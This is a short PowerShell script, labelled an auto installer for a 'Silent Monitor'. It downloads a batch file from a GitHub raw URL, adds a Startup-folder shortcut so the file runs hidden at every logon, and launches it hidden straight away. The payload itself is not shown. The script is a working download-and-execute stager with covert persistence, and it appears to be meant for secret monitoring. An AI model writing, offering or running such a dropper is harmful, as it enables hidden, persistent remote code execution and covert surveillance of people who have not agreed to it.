# =============================================
# Auto Installer for Silent Monitor
# =============================================

$batUrl = "https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/ss.bat"
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$batPath = "$env:APPDATA\ss.bat"

# Download the latest ss.bat
try {
    Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
} catch {
    exit
}

# Create shortcut in Startup folder that runs the bat hidden
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut("$startupFolder\Monitor.lnk")
$shortcut.TargetPath = $batPath
$shortcut.WindowStyle = 7  # Hidden
$shortcut.Save()

# Run it immediately in hidden mode
Start-Process $batPath -WindowStyle Hidden

Write-Host "Monitor installed and started successfully." -ForegroundColor Green
